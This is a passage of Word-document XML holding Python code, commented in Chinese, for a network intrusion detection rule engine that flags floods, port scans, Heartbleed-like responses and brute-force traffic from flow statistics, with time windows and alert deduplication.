        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hits.append(RuleHit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A208B03">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "flood_single", "DoS Hulk", pps, FLOOD_PPS,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2912FC17">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"单流 {fwd:g} 个前向包、{pps:g} 包/秒，超过洪泛阈值",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73EF4156">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECF9EA6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if fwd &lt;= SCAN_MAX_FWD_PKTS and bwd == 0 and syn &gt;= 1 and ack == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0515DAF3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hits.append(RuleHit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E6A1512">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "scan_single", "PortScan", SCAN_MAX_FWD_PKTS - fwd + 1, 1.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030D5E60">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"单包 SYN 且无应答（前向 {fwd:g} 包、后向 0 包）",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="091A86B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A335E2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if bwd_bytes &gt;= HEARTBLEED_BWD_BYTES and bwd &lt;= HEARTBLEED_MAX_PKTS and fwd &lt;= HEARTBLEED_MAX_PKTS:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E98E34">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hits.append(RuleHit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A18E502">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "heartbleed_single", "Heartbleed", bwd_bytes, HEARTBLEED_BWD_BYTES,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33325F85">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"极少包数换回 {bwd_bytes:g} 字节后向载荷，符合心跳响应过量读取",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48178333">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE2CCA4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return hits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B39856D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2587F0B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B5D88AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def pick(hits) -&gt; RuleHit | None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3367F706">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """取优先级最高（列表最前）的那条。规则之间没有通用量纲，不能按 strength 比大小。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04DC9B5F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return hits[0] if hits else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F58CB99">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="625BE3EB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74FF5B6E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class RuleEngine:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B011C8E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """窗口规则。**有状态**，一个探针一份实例（内部按 probe_id 分域）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A33CCCC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60FE3A6A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    去重：同一条规则在同一个作用域上，`cooldown` 秒内只报一次。否则一次 5000 端口的扫描</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17929E11">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    会给每条流都生成一条告警，看板会被淹没，反而看不出"这是一次扫描"。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5491449D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05251734">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AF636CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __init__(self, *, window: float = WINDOW_S, cooldown: float | None = None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575AAE64">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 port_scan_ports: int = PORT_SCAN_PORTS,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597BC9B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 port_scan_max_pkts: float = PORT_SCAN_MAX_PKTS,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5408A708">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 syn_flood_conns: int = SYN_FLOOD_CONNS,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26449902">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 brute_conns: int = BRUTE_CONNS,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4E6DC7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 max_scope: int = 20000):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58AA7CFC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.window = window</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5894F4D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.cooldown = window if cooldown is None else cooldown</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641EB71E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.port_scan_ports = port_scan_ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="017106CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.port_scan_max_pkts = port_scan_max_pkts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F659C64">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.syn_flood_conns = syn_flood_conns</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F93342F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.brute_conns = brute_conns</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00245D82">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.max_scope = max_scope</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="085318CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self._src: OrderedDict[str, deque] = OrderedDict()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62377246">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self._dst: OrderedDict[str, deque] = OrderedDict()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8D2058">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self._fired: dict[tuple, float] = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB25667">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.counts: dict[str, int] = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6641997D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.by_category: dict[str, int] = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CBFD88C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A291D2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ---------------------------------------------------------------- 内部</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67892647">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66F0842E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    @staticmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACB4BD9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _trim(dq: deque, cutoff: float) -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59CF99C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        while dq and dq[0][0] &lt; cutoff:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486C4E28">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            dq.popleft()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A8487D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56BE46EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _bucket(self, store: OrderedDict, key: str, cutoff: float) -&gt; deque:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743B2F67">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        dq = store.get(key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A2F2C37">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if dq is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0ABC41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            dq = deque()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FCFAF19">
